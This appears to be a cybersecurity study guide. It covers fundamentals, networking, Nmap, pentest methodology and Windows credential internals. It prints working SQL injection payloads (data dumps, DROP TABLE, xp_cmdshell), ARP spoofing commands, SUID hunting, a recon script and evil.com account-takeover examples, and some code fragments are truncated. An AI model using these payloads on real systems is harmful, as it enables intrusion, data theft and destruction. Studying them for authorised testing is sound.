What is Cybersecurity?

Cybersecurity is the practice of protecting systems, networks, programs, and data from digital attacks, unauthorized access, damage, or theft. It encompasses technologies, processes, and controls designed to safeguard the confidentiality, integrity, and availability of information.

💡 Why Cybersecurity Matters
Cybercrime damages are projected to reach $10.5 trillion annually by 2025. Every organization, regardless of size, is a potential target. Understanding cybersecurity is no longer optional — it's essential.

The CIA Triad

The CIA Triad is the foundational model of information security. Every security control, policy, and mechanism exists to protect one or more of these three pillars:

🔒
Confidentiality
Ensuring that information is accessible only to authorized individuals. Prevents unauthorized disclosure of sensitive data. Achieved through encryption, access controls, and data classification.
✅
Integrity
Maintaining the accuracy and consistency of data throughout its lifecycle. Prevents unauthorized modification. Achieved through hashing, checksums, version control, and digital signatures.
⚡
Availability
Ensuring that systems and data are accessible to authorized users when needed. Prevents disruption of service. Achieved through redundancy, backups, load balancing, and DDoS protection.

The AAA Framework

Beyond the CIA Triad, the AAA framework provides the operational structure for identity and access management:

▶ Authentication — "Who are you?"

Verifying the identity of a user, device, or system. Factors include:

  • Something you know — Passwords, PINs, security questions
  • Something you have — Hardware tokens, smart cards, phone (OTP)
  • Something you are — Biometrics: fingerprints, iris scan, facial recognition
  • Multi-Factor Authentication (MFA) — Combining two or more factors for stronger security
▶ Authorization — "What can you do?"

Determining what an authenticated user is allowed to access or perform:

  • Role-Based Access Control (RBAC) — Permissions assigned based on job role
  • Discretionary Access Control (DAC) — Owner decides who gets access
  • Mandatory Access Control (MAC) — System-enforced labels and clearance levels
  • Principle of Least Privilege — Users get only the minimum access needed
▶ Accounting — "What did you do?"

Tracking and recording user activities for audit and forensics:

  • Logging — Recording events, logins, file access, and changes
  • Auditing — Regular review of logs for anomalies and compliance
  • SIEM Systems — Security Information and Event Management tools (Splunk, ELK)
  • Non-repudiation — Ensuring actions can be attributed and cannot be denied

🌐 Phishing & Social Engineering

Psychological manipulation techniques that exploit human trust to bypass technical controls.

▶ Phishing Variants
  • Email Phishing — Mass emails impersonating trusted entities (banks, services)
  • Spear Phishing — Targeted emails directed at specific individuals or organizations
  • Whaling — Spear phishing targeting C-suite executives and high-value targets
  • Vishing — Voice-based phishing via phone calls (fake IRS, tech support)
  • Smishing — SMS-based phishing with malicious links
  • Clone Phishing — Duplicating legitimate emails with malicious modifications
  • Business Email Compromise (BEC) — Impersonating executives to authorize fraudulent wire transfers
▶ Social Engineering Tactics
  • Pretexting — Creating a fabricated scenario to extract information
  • Baiting — Leaving infected USB drives in public places
  • Tailgating — Following authorized personnel through secure doors
  • Quid Pro Quo — Offering a service in exchange for information
  • Impersonation — Posing as IT support, law enforcement, or authority figure
  • Watering Hole — Compromising websites frequently visited by the target group

🔗 Man-in-the-Middle (MITM)

Attacker intercepts communication between two parties without their knowledge, enabling eavesdropping or data manipulation.

  • ARP Spoofing — Sending fake ARP messages to link attacker's MAC with the gateway's IP
  • DNS Spoofing — Redirecting DNS queries to malicious servers (cache poisoning)
  • SSL Stripping — Downgrading HTTPS connections to HTTP
  • WiFi Eavesdropping — Evil twin access points mimicking legitimate networks
  • Session Hijacking — Stealing session cookies to impersonate users
  • HTTPS Spoofing — Using fraudulent SSL certificates

🔔 Ransomware Deep Dive

Ransomware has evolved into a multi-billion dollar criminal enterprise. The attack lifecycle typically follows these stages:

Ransomware Kill Chain
$ Stage 1: Initial Access - Phishing emails with malicious attachments/links - Exploiting public-facing vulnerabilities (RDP, VPN) - Supply chain compromise (Kaseya VSA attack) $ Stage 2: Execution & Persistence - Deploying payloads via PowerShell, macros, or scripts - Creating scheduled tasks and registry modifications - Installing backdoors for re-entry $ Stage 3: Privilege Escalation - Exploiting local vulnerabilities (PrintNightmare, ZeroLogon) - Credential harvesting (Mimikatz, LSASS dumping) - Domain admin compromise $ Stage 4: Lateral Movement - Pivoting through the network using stolen credentials - Mapping critical assets and backup systems - Deploying ransomware across all accessible endpoints $ Stage 5: Exfiltration & Encryption - Stealing sensitive data (double extortion) - Encrypting files with strong algorithms (AES-256 + RSA-2048) - Destroying backups before deployment $ Stage 6: Extortion - Ransom demand with payment in cryptocurrency - Threatening to leak stolen data on dark web - Setting deadlines with increasing ransom amounts

💡 Zero-Day Exploits

A zero-day vulnerability is a flaw unknown to the vendor, meaning no patch exists. The term "zero-day" refers to zero days since discovery — the attackers have a head start.

⚠ Zero-Day Lifecycle
Discovery → Weaponization → Exploitation → Exfiltration → Patch/Remediation. During the gap between exploitation and patch release, organizations are defenseless without behavioral/heuristic detection.
  • Stuxnet (2010) — First known zero-day worm targeting SCADA systems, destroyed Iranian nuclear centrifuges
  • EternalBlue (2017) — NSA exploit leaked by Shadow Brokers, powered WannaCry and NotPetya
  • Log4Shell (2021) — Critical RCE in Apache Log4j affecting millions of Java applications
  • ProxyLogon/ProxyShell (2021) — Microsoft Exchange vulnerabilities exploited by Hafnium APT

Defense in Depth

Defense in depth is a layered security strategy where multiple defensive measures are used to protect assets. If one layer fails, another layer provides protection.

Defense Layers (Outside → Inside)
Layer 1: Policies & Procedures - Security policies, acceptable use, incident response plans Layer 2: Physical Security - Locks, badges, CCTV, mantraps, environmental controls Layer 3: Perimeter Security - Firewalls, DMZ, IDS/IPS, VPN gateways Layer 4: Network Security - Network segmentation, VLANs, zero-trust networking Layer 5: Host Security - Hardened OS, EDR, host-based firewall, disk encryption Layer 6: Application Security - Secure coding, WAF, input validation, code signing Layer 7: Data Security - Encryption (AES-256), DLP, access controls, backups Layer 8: User Training - Phishing simulations, security awareness, MFA enforcement

Risk Assessment

Risk is the likelihood of a threat exploiting a vulnerability, multiplied by the impact. The fundamental formula:

Risk Formula
Risk = Threat x Vulnerability x Impact Qualitative Assessment: - High / Medium / Low ratings - Risk matrix / heat map visualization - Best for quick prioritization Quantitative Assessment: - Asset Value (AV) - What is the asset worth? - Exposure Factor (EF) - % of value lost in an incident - Single Loss Expectancy (SLE) = AV x EF - Annual Rate of Occurrence (ARO) - How often per year - Annual Loss Expectancy (ALE) = SLE x ARO Example: Asset: Customer database valued at $500,000 Exposure Factor: 40% (partial breach) SLE = $500,000 x 0.40 = $200,000 ARO = 0.2 (once every 5 years) ALE = $200,000 x 0.2 = $40,000/year

Risk Response Strategies

🚷
Risk Avoidance
Eliminate the risk entirely by not engaging in the activity. Example: not collecting sensitive data you don't need.
🔄
Risk Mitigation
Implement controls to reduce the likelihood or impact. Most common strategy. Example: installing firewalls, encryption.
💰
Risk Transfer
Shift the financial burden to a third party. Example: purchasing cyber insurance or outsourcing to a managed security provider.
✅
Risk Acceptance
Acknowledge the risk and accept it when mitigation cost exceeds the potential loss. Must be formally documented.

💡 Key Concept

🔑 File Permissions Deep Dive

Linux uses a permission model with three classes (user, group, others) and three permission types (read, write, execute).

Understanding Permissions
Permission Letters: r = read (4) w = write (2) x = execute (1) Example output of ls -l: -rwxr-xr-- 1 user group 4096 Jan 15 10:30 script.sh │├─┤├─┤├─┤ │ │ │ └── Others: r-- (read only = 4) │ │ └───── Group: r-x (read+execute = 5) │ └───────── User: rwx (read+write+execute = 7) └─────────── File type (- = file, d = directory) Octal Permission Examples: chmod 755 script.sh # rwxr-xr-x (common for scripts) chmod 644 file.txt # rw-r--r-- (common for config files) chmod 700 secret.sh # rwx------ (owner only) chmod 600 id_rsa # rw------- (SSH keys) chmod 777 public/ # rwxrwxrwx (DANGEROUS - avoid) Symbolic Permissions: chmod u+x script.sh # Add execute for user chmod g-w file.txt # Remove write for group chmod o= file.txt # Remove all permissions for others chmod a+r file.txt # Add read for all

SUID, SGID, and Sticky Bit

Special Permissions
SUID (Set User ID) - chmod u+s or 4xxx - Runs with the FILE OWNER's permissions, not the user who runs it - Example: /usr/bin/passwd has SUID root so users can change their password - Security risk: SUID binaries are common privilege escalation vectors SGID (Set Group ID) - chmod g+s or 2xxx - On files: runs with the file group's permissions - On directories: new files inherit the directory's group - Example: /usr/bin/wall has SGID to broadcast to all users' terminals Sticky Bit - chmod +t or 1xxx - On directories: only the file owner can delete files within - Example: /tmp has sticky bit (drwxrwxrwt) so users can't delete each other's files - The 't' in the last position indicates sticky bit is set Finding Special Permissions (Privilege Escalation Recon): find / -perm -4000 -type f 2>/dev/null # Find all SUID files find / -perm -2000 -type f 2>/dev/null # Find all SGID files find / -perm -1000 -type d 2>/dev/null # Find all sticky bit dirs

What is Termux?

Termux is an Android terminal emulator and Linux environment that runs directly on your device without requiring root access. It provides a full Linux environment with thousands of packages, making your phone a portable cybersecurity workstation.

💡 How Termux Works
  • Uses a custom Linux environment (not a VM or container) running natively on Android
  • Files stored in /data/data/com.termux/files/home (your home directory)
  • No root required, but root is supported for advanced operations
  • Has its own package manager (pkg/apt) separate from Android
  • Can run servers, compilers, scripting languages, and GUI apps (via VNC)
  • Interacts with Android via Termux API (SMS, calls, sensors, clipboard)

💡 PRoot vs Chroot
  • PRoot uses ptrace() to intercept system calls — no root needed, but slower
  • Chroot changes the root directory — requires root, but faster
  • proot-distro uses PRoot, which is why it works without rooting your phone
  • For maximum performance, consider rooting and using chroot instead

▶ Common Errors & Fixes
ProblemSolution
"Unable to locate package" Run pkg update first. If still failing, run termux-change-repo and select a different mirror.
"Permission denied" Use chmod +x to make scripts executable. Avoid sudo unless rooted.
"Process completed (signal 9)" Android killed the process due to memory. Reduce memory usage or run killall -9 zsh then restart.

The OSI Model

The Open Systems Interconnection model is a conceptual framework that standardizes network communication into seven abstraction layers. Understanding each layer is critical for identifying where vulnerabilities exist and how attacks operate.

The layer closest to the end user. Protocols here are what applications use to communicate over the network.

TCP — Transmission Control Protocol

Connection-oriented, reliable, ordered delivery. Uses acknowledgments, sequencing, and flow control.

TCP 3-Way Handshake

Connection Establishment

Step 1 — SYN: Client sends a TCP segment with SYN flag set and an initial sequence number (ISN, e.g., 0).
Step 2 — SYN-ACK: Server responds with SYN+ACK flags, acknowledging the client's ISN (ISN+1) and providing its own ISN.
Step 3 — ACK: Client sends ACK, acknowledging the server's ISN (server ISN+1). Connection is now ESTABLISHED.

Server → Client    [SYN,ACK]  Seq=1000, Ack=1
Client → Server    [ACK]      Seq=1, Ack=1001
                    ──── Connection Established ────
Client → Server    [PSH,ACK]  Seq=1, Ack=1001  [HTTP GET /]
Server → Client    [PSH,ACK]  Seq=1001, Ack=100  [200 OK ...]
                    ──── Connection Teardown ────
Client → Server    [FIN,ACK]  Seq=100, Ack=2500
Server → Client    [ACK]      Seq=2500, Ack=101
Server → Client    [FIN,ACK]  Seq=2500, Ack=101

CIDR Notation & Subnetting

CIDR (Classless Inter-Domain Routing) replaces classful addressing. The suffix number indicates how many bits are the network portion.

CIDR Examples
192.168.1.0/24
  ├── 192.168.1  = network portion (24 bits)
  └── .0          = host portion (8 bits)
  Hosts: 2^8 - 2 = 254 usable hosts (.1 - .254)
  Broadcast: 192.168.1.255

10.0.0.0/8
  ├── 10          = network portion (8 bits)
  └── .0.0.0      = host portion (24 bits)
  Hosts: 2^24 - 2 = 16,777,214 usable hosts

172.16.5.0/20
  ├── 172.16.0000 0101.0  = network
  └── CIDR /20 means first 20 bits are network
  Block size: 2^(32-20) = 4096 addresses
  Network: 172.16.0.0
  Range: 172.16.0.1 – 172.16.15.254
  Broadcast: 172.16.15.255

Common CIDR table:
  /32 = 1 host          /28 = 14 hosts
  /31 = 2 hosts         /27 = 30 hosts
  /30 = 2 hosts (P2P)   /26 = 62 hosts
  /29 = 6 hosts         /25 = 126 hosts
  /24 = 254 hosts       /16 = 65,534 hosts
  /8  = 16M+ hosts
Subnetting Practice Tip

The magic number method: Find the interesting octet (where the subnet mask is not 255 or 0). Subtract the subnet mask value from 256. That's your block size. Count up by the block size to find each subnet.

DNS Resolution Process

Recursive DNS Lookup Flow
1. User types "www.example.com" in browser
2. Browser checks local cache → MISS
3. OS checks hosts file → MISS
4. OS checks local DNS resolver cache → MISS
5. Query sent to configured DNS server (e.g., 8.8.8.8)
6. Resolver checks its cache → MISS
7. Resolver queries ROOT name server (.) — "Who handles .com?"
8. Root server responds → "Ask the .com TLD servers"
9. Resolver queries .COM TLD server — "Who handles example.com?"
10. TLD responds → "Ask ns1.example.com (authoritative)"
11. Resolver queries authoritative NS — "What is www.example.com?"
12. Authoritative responds → "It's 93.184.216.34 (TTL: 3600s)"
13. Resolver caches the result and returns it to client
14. Browser connects to 93.184.216.34

DNS Attacks

🎯
DNS Spoofing/Poisoning
Injecting false DNS responses to redirect users to malicious IPs. Exploits lack of DNSSEC validation or compromises the resolver cache.
💀
DNS Amplification
DDoS technique using open DNS resolvers. Attacker sends small queries with spoofed source IP (victim), triggers large responses. Amplification factor: 28–54x.
🔗
DNS Rebinding
Bypasses same-origin policy by alternating DNS responses between a public IP and localhost, allowing browser JS to access internal services.
🌐
Subdomain Takeover
CNAME pointing to an unclaimed external service (e.g., GitHub Pages, Heroku). Attacker claims the resource and serves malicious content.
🔒
DNS Tunneling
Encodes data within DNS queries/responses to exfiltrate data or establish C2 channels, bypassing firewalls that don't inspect DNS payload deeply.
🚫
DNS NXDOMAIN Attack
Flooding DNS servers with queries for non-existent domains, exhausting server resources and causing denial of service.

DHCP, ARP, and ICMP

DHCP — Dynamic Host Configuration Protocol

Automatically assigns IP addresses and network configuration to devices.

DHCP DORA Process
Client → Broadcast    DHCPDISCOVER     (src: 0.0.0.0, dst: 255.255.255.255)
Server → Unicast      DHCPOFFER        (offers IP: 192.168.1.100, mask: 255.255.255.0)
Client → Broadcast    DHCPREQUEST      (requests 192.168.1.100)
Server → Unicast      DHCPACK          (confirms lease, gateway, DNS, etc.)

Lease: 86400s (24 hours) — client renews at 50% (T1) and 87.5% (T2)
DHCP Attacks

DHCP Starvation: Exhausts the DHCP pool by flooding DISCOVER requests with spoofed MAC addresses, preventing legitimate clients from obtaining leases.
Rogue DHCP Server: An attacker sets up a malicious DHCP server on the network, handing out incorrect gateway/DNS settings to intercept traffic (man-in-the-middle).

Tor — The Onion Router

Routes traffic through 3 encrypted layers (relays) to anonymize the source.

How Tor Works

1. Client builds a circuit: Guard relay → Middle relay → Exit relay
2. Each relay only knows its adjacent nodes (onion layers)
3. Data is wrapped in 3 layers of encryption
4. Exit relay decrypts the final layer and forwards to destination
5. Destination sees the exit relay's IP, not the client's

Onion services (.onion): End-to-end encryption — no exit relay needed. Hidden service introduces itself to the Tor network via a rendezvous point.

Network Attacks

▶Man-in-the-Middle (MITM)

An attacker secretly intercepts and potentially alters communication between two parties.

Common MITM vectors:

  • ARP Spoofing: Send forged ARP replies mapping the gateway's IP to the attacker's MAC (tools: arpspoof, BetterCAP)
  • DNS Spoofing: Redirect DNS responses to attacker-controlled IPs
  • SSL Strip: Downgrade HTTPS to HTTP by intercepting the TLS handshake (tools: sslstrip, bettercap)
  • Wi-Fi Evil Twin: Rogue AP mimicking a legitimate network (tools: airbase-ng, Fluxion)
  • SSL/TLS Interception: Corporate proxy re-signs traffic with its own CA (requires trusted CA on client)
  • BGP Hijacking: Misroute internet traffic through attacker-controlled AS (rare, high impact)
▶ARP Spoofing / Poisoning

Attacker sends unsolicited ARP replies to associate their MAC address with the IP of another host (typically the default gateway).

ARP Spoofing with arpspoof
# Enable IP forwarding so traffic still flows
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof ARP replies to the victim
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# Spoof ARP replies to the gateway (reverse)
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Detection — look for duplicate MACs in ARP table
arp -a | sort -t. -k3 -n
# Or use arpwatch for monitoring
arpwatch -i eth0

Countermeasures: Dynamic ARP Inspection (DAI), static ARP entries, 802.1X, VPN usage.

▶DNS Hijacking

Redirecting DNS queries to resolve attacker-controlled IPs instead of legitimate ones.

Methods:

  • Router DNS override: Change DNS settings on the router to redirect all network DNS queries
  • hosts file modification: Local override of DNS on a compromised machine
  • DNS cache poisoning: Injecting malicious records into a resolver's cache
  • Malicious DNS server: Compromising or deploying a rogue DNS server
  • Client-side DNS manipulation: Malware changing system DNS settings (e.g., to 8.8.8.8 controlled by attacker)

Countermeasures: DNSSEC, DoH (DNS over HTTPS), DoT (DNS over TLS), network monitoring.

Nmap Deep Dive

Nmap (Network Mapper) is the industry-standard network scanner. It discovers hosts, ports, services, OS, and vulnerabilities.

Basic Scanning

Nmap Fundamentals
# Ping sweep — discover live hosts
nmap -sn 192.168.1.0/24
nmap -sn -PE 192.168.1.0/24          # ICMP echo only
nmap -sn -PA80,443 192.168.1.0/24    # TCP ACK ping

# Quick scan — top 1000 ports
nmap 192.168.1.1

# Full port scan — all 65535 TCP ports
nmap -p- 192.168.1.1
nmap -p- --min-rate 5000 192.168.1.1  # fast full scan

# Specific ports
nmap -p 80,443,8080,3306 192.168.1.1
nmap -p 1-1000 192.168.1.1

# UDP scan (slow but important)
nmap -sU -p 53,67,68,69,123,161,162,500,514,1900 192.168.1.1
nmap -sU --top-ports 20 192.168.1.1

# Service version detection
nmap -sV 192.168.1.1
nmap -sV -sC 192.168.1.1  # + default scripts

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 192.168.1.1

Scan Types

FlagTypeDescriptionDetection Risk
-sSTCP SYN (Half-Open)Sends SYN, reads SYN-ACK, sends RST (never completes handshake). Default if root.Low
-sTTCP ConnectFull TCP handshake using connect() syscall. Works without root.High (full log entry)
-sUUDPSends UDP packets, waits for ICMP port unreachable or response. Very slow.Low
-sATCP ACKSends ACK, gets RST (firewall mapping). Used to map firewall rules.Medium
-sNTCP NULLNo flags set. Bypasses some stateless firewalls.Low
-sFTCP FINFIN flag only. Similar to NULL scan — RFC 793 behavior.Low
-sXTCP XmasFIN+PSH+URG flags. "Christmas tree" packet.Low
-snPing ScanHost discovery only — no port scan.Low
-PnSkip Host DiscoveryTreat all hosts as online. Bypasses ICMP blocks.—
Firewall/IDS Evasion

NULL/FIN/Xmas scans exploit RFC 793 compliance: compliant systems send RST for packets without SYN/ACK/RST flags, while firewalls often drop them silently. ACK scan (-sA) maps firewall rules — RST response means unfiltered, no response means filtered.

Masscan — Large-Scale Scanning

The fastest internet port scanner. Can scan the entire IPv4 address space in under 5 minutes. Asynchronous, zero-loss, SYN-only.

Masscan vs Nmap

Use Masscan for fast, large-scale port discovery (entire networks). Use Nmap for detailed service enumeration on discovered ports. Masscan is ~60,000x faster but only does SYN scans and limited version detection.

Ethical Hacking Methodology

The systematic approach to professional penetration testing — from engagement to report

🆕 New to Cybersecurity?

Why Methodology Matters
Without a structured methodology, penetration testing becomes random vulnerability scanning. A professional methodology ensures completeness, repeatability, legal compliance, and defensible findings. The industry standard frameworks below are what separate a hobbyist from a professional pentester.

PTES — The Penetration Testing Execution Standard

PTES is the industry framework that standardizes how penetration tests are performed. It defines seven major sections covering the full lifecycle of a pentest engagement.

📋
1. Pre-Engagement
Scoping, Rules of Engagement (RoE), NDA, legal authorization. Everything agreed upon before touching the target.
🔍
2. Intelligence Gathering
Passive and active reconnaissance. Understanding the target's attack surface without necessarily touching their infrastructure directly.
🎯
3. Threat Modeling
Identifying likely attack vectors based on the organization's business logic, assets, and infrastructure profile.
🔎
4. Vulnerability Analysis
Systematic enumeration and scanning. Identifying weaknesses through both automated tools and manual inspection.
💥
5. Exploitation
Active verification of vulnerabilities through controlled exploitation. Proving impact beyond just identification.
📊
6. Post-Exploitation
Determining business impact. Lateral movement, privilege escalation, data access, persistence mechanisms.
📝
7. Reporting
Documenting findings, risk ratings, remediation guidance. Executive summary through technical appendix.

The 5 Phases of Ethical Hacking

▶ Phase 1 — Reconnaissance (Information Gathering)

Red Team vs Blue Team vs Purple Team

🔴
Red Team (Offense)
Simulates real-world adversaries. Uses advanced TTPs (MITRE ATT&CK). Goal: breach the target, maintain persistence, exfiltrate data. Operates with maximum stealth.
🔵
Blue Team (Defense)
Defends the network. Monitors SIEM, responds to incidents, hardens systems, patches vulnerabilities. Operates the SOC, manages firewalls, IDS/IPS, EDR.
🟥
Purple Team (Collaborative)
Red and Blue work together in real-time. Red attacks, Blue defends, both share insights. Maximizes security improvement by closing detection gaps immediately.
MITRE ATT&CK Framework
Both Red and Blue teams use MITRE ATT&CK as their common language. Red teams map their TTPs to ATT&CK techniques. Blue teams build detection rules mapped to the same techniques.

Payload Types Explained

🔄
Reverse Shell
Target connects back to attacker. Bypasses inbound firewall rules. Requires attacker to have a listening port. Most common in pentesting.
🔗
Bind Shell
Payload opens a port on the target that attacker connects to. Useful when target has strict outbound rules. Risk: anyone can connect to the bound port.
📦
Staged Payload
Small initial stager downloads the full payload. Requires matching multi/handler. More evasive due to smaller initial footprint.
📋
Stageless Payload

SQL Injection — Deep Dive

SQL Injection occurs when user input is concatenated directly into SQL queries without parameterization. Despite being discovered in the late 1990s, SQLi remains one of the top web application vulnerabilities.

Types of SQL Injection

▶ Union-Based SQL Injection

Uses UNION SELECT to combine results from the original query with results from injected query. Requires knowing the exact number of columns.

Union-Based SQLi Technique
# Step 1: Find number of columns using ORDER BY
https://example.com/page?id=1 ORDER BY 1-- -
https://example.com/page?id=1 ORDER BY 2-- -
https://example.com/page?id=1 ORDER BY 3-- -
# Error at ORDER BY 3 = 2 columns

# Step 2: Find which columns are reflected
https://example.com/page?id=1 UNION SELECT 1,2-- -

# Step 3: Extract data from reflected columns
# Get database name
https://example.com/page?id=1 UNION SELECT 1,database()-- -
# Output: 2, myapp_db

# Get table names
https://example.com/page?id=1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -

# Get column names
https://example.com/page?id=1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -

# Dump data
https://example.com/page?id=1 UNION SELECT 1,group_concat(username,0x3a,password) FROM users-- -

# MySQL: use CONCAT for multiple columns in one
UNION SELECT 1,CONCAT(username,0x3a,email,0x3a,password) FROM users LIMIT 0,1-- -
SQLi in Different Databases
MySQL: UNION SELECT, information_schema, -- - comment
PostgreSQL: UNION SELECT, pg_catalog, -- comment
MSSQL: UNION SELECT, INFORMATION_SCHEMA, -- comment, EXEC()
Oracle: No information_schema, use ALL_TABLES, UNION SELECT FROM DUAL, -- comment
▶ Blind SQL Injection

No data is reflected in the response. You infer information by observing boolean conditions or timing differences.

Boolean-Based Blind

Boolean Blind SQLi
# Test with true condition - should return normal page
https://example.com/page?id=1 AND 1=1-- -

# Test with false condition - should return different page
https://example.com/page?id=1 AND 1=2-- -

# If responses differ, boolean blind SQLi is confirmed

# Extract data character by character
# Is first letter of database name 'a'?
https://example.com/page?id=1 AND SUBSTRING(database(),1,1)='a'-- -

# Use binary search for faster extraction
https://example.com/page?id=1 AND ASCII(SUBSTRING(database(),1,1))>96-- -

# Extract full database name
# Length
https://example.com/page?id=1 AND LENGTH(database())=8-- -
# Characters
https://example.com/page?id=1 AND SUBSTRING(database(),1,1)='m'-- -
https://example.com/page?id=1 AND SUBSTRING(database(),2,1)='y'-- -

Time-Based Blind

Time-Based Blind SQLi
# MySQL - conditional delay
https://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)-- -
# If page takes 5+ seconds, injection works

# Extract data with timing
https://example.com/page?id=1 AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)-- -
# 5 second delay = first letter is 'm'

# PostgreSQL
https://example.com/page?id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

# MSSQL
https://example.com/page?id=1; IF (1=1) WAITFOR DELAY '0:0:5'-- -
▶ Error-Based SQL Injection

Forces the database to generate error messages that contain the extracted data.

Error-Based SQLi Techniques
# MySQL - extractvalue / updatexml
https://example.com/page?id=1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))-- -
# Error: XPATH syntax error: '~myapp_db~'

https://example.com/page?id=1 AND UPDATEXML(1, CONCAT(0x7e, version(), 0x7e), 1)-- -
# Error: XPATH syntax error: '~5.7.42~'

# MySQL - double query
https://example.com/page?id=1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

# PostgreSQL - CAST error
https://example.com/page?id=1 AND 1=CAST((SELECT version()) AS INT)-- -

# MSSQL - convert error
https://example.com/page?id=1 AND 1=CONVERT(INT, (SELECT TOP 1 table_name FROM information_schema.tables))-- -
▶ Stacked Queries

Allows executing multiple SQL statements by appending ;. Extremely dangerous — can lead to full database compromise.

Stacked Queries SQLi
# Insert a new admin user
https://example.com/page?id=1; INSERT INTO users(username,password) VALUES('hacker','hashedpass')-- -

# Delete data
https://example.com/page?id=1; DROP TABLE logs-- -

# Update existing records
https://example.com/page?id=1; UPDATE users SET role='admin' WHERE username='attacker'-- -

# MSSQL: Execute OS commands via xp_cmdshell
https://example.com/page?id=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'-- -

▶ Race Condition Hunting

Race conditions occur when the outcome of operations depends on the timing and ordering of events. In web apps, this often means performing the same action multiple times before the first completes.

Race Condition Exploitation
# Using Burp Suite Turbo Intruder

# 2. Use race.py template
# 3. Send multiple requests simultaneously

# Example: Double-spending a coupon
# Send 10 parallel requests with the same coupon
# If coupon is checked and deducted after use,
# all 10 may succeed before deduction

# Using curl + GNU parallel
for i in $(seq 1 10); do

import threading, requests

def exploit():

threads = [threading.Thread(target=exploit) for _ in range(20)]

▶ IDOR / AOR Exploitation

Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA) occurs when an application exposes internal object references without proper authorization checks.

IDOR Testing Techniques
# Basic IDOR - change ID in URL
# Your profile: https://target.com/api/users/12345/profile
# Try: https://target.com/api/users/12346/profile

# IDOR in API endpoints
GET /api/v1/orders/ORDER_12345

# UUID/guessable ID patterns
# Sequential: 1, 2, 3, 4...
# Timestamp-based: 1694000000_001
# Predictable: first_last_001

# IDOR in file download
https://target.com/documents/report_12345.pdf
# Try: report_12346.pdf, report_12347.pdf...

query { user(id: "12345") { email, phone, ssn } }

▶ Account Takeover Chains

Account takeover (ATO) chains combine multiple low/medium severity issues into a critical finding.

Account Takeover Attack Vectors
# 1. Password reset flow flaws
# - Token in URL (leakable via Referer header)
# - Predictable reset tokens (sequential, timestamp-based)
# - No rate limiting on reset code verification
# - Token not invalidated after use
# - Reset token valid for too long

# 2. OAuth/SSO misconfigurations
# - Open redirect in OAuth callback
#   https://target.com/auth/callback?redirect=https://evil.com
# - Missing state parameter
# - Email verification bypass after OAuth linking

# 3. Email change without verification
# 1. Log into victim's account (via other vuln)
# 2. Change email to attacker@evil.com
# 3. Request password reset on attacker email
# 4. Account taken over

# 4. API key / session token leakage
# - Tokens in URLs (logged by proxies, Referer headers)
# - Tokens in JS source code
# - Tokens in error messages
# - Tokens not expired on password change

# 5. Host header injection
# Password reset uses Host header to build reset link:
Host: evil.com
# Reset link sent to victim: https://evil.com/reset?token=ABC
# Attacker controls evil.com and captures the token

# 6. 2FA bypass
# - Bruteforce 4-digit code (no rate limit)
# - Response manipulation (change response from "incorrect" to "correct")
# - Skip 2FA step by directly accessing authenticated endpoint
# - Disable 2FA without verifying current 2FA

Automated Recon Script
#!/bin/bash
TARGET=$1
mkdir -p recon/$TARGET

# Subdomain enumeration
subfinder -d $TARGET -silent | sort -u > recon/$TARGET/subs.txt
echo "[+] $(wc -l < recon/$TARGET/subs.txt) unique subdomains found"

# Probe for live hosts
cat recon/$TARGET/subs.txt | httpx -silent -status-code -title -tech-detect > recon/$TARGET/live.txt
echo "[+] $(wc -l < recon/$TARGET/live.txt) live hosts found"

# Gather historical URLs
cat recon/$TARGET/subs.txt | waybackurls | sort -u > recon/$TARGET/wayback.txt
cat recon/$TARGET/subs.txt | gau | sort -u > recon/$TARGET/gau.txt
cat recon/$TARGET/wayback.txt recon/$TARGET/gau.txt | sort -u > recon/$TARGET/all_urls.txt

# Extract interesting parameters
cat recon/$TARGET/all_urls.txt | grep "=" | unfurl keys | sort -u > recon/$TARGET/params.txt

# Extract JS files
cat recon/$TARGET/all_urls.txt | grep -E "\.js$" | sort -u > recon/$TARGET/js_files.txt

# Run nuclei with all templates
nuclei -l recon/$TARGET/live.txt -t ~/nuclei-templates/ -o recon/$TARGET/nuclei_results.txt -silent

# Port scan
cat recon/$TARGET/live.txt | cut -d' ' -f1 | naabu -top-ports 1000 -silent > recon/$TARGET/ports.txt

echo "[+] Recon complete for $TARGET"
echo "[+] Results in recon/$TARGET/"

▶Windows Architecture Deep Dive

Registry & SAM Database

The Windows registry stores configuration data. The SAM (Security Account Manager) stores hashed passwords for local accounts.

Key Registry Hives
HKEY_LOCAL_MACHINE\SYSTEM      — System state, services
HKEY_LOCAL_MACHINE\SOFTWARE    — Installed software
HKEY_LOCAL_MACHINE\SAM         — User account hashes (locked)
HKEY_LOCAL_MACHINE\SECURITY    — LSA secrets, cache
HKEY_CURRENT_USER\Software     — Per-user config

LSASS (Local Security Authority Subsystem)

LSASS authenticates users, stores credentials in memory, and enforces security policies. It is the primary target for credential theft.

Why LSASS Matters

LSASS caches plaintext passwords, NTLM hashes, Kerberos tickets, and WDigest credentials. Tools like Mimikatz, ProcDump, and Pypykatz dump LSASS to extract these.

Access Tokens

Every process has a token identifying the user and their privileges. Token impersonation allows privilege escalation via techniques like:

🔑
SeImpersonatePrivilege
Allows impersonating tokens. Exploited via Potato attacks (Hot/Potato/Juicy/Pritu).
🎫
Token Theft
Steal token from a privileged process, then impersonate it via NtDuplicateToken.

Token Manipulation

▶Authorization Documentation

Rules of Engagement (ROE)

Essential ROE Components

Scope: Exact systems, networks, IPs, domains in scope
Out-of-Scope: Systems explicitly excluded from testing
Timeline: Start/end dates, testing hours
Methods: Allowed attack types (social engineering, DoS, physical)
Emergency Contacts: Who to call if something breaks
Data Handling: How sensitive data will be handled and destroyed
Reporting: What findings to report, how, to whom
Legal Language: Indemnification, liability limitations

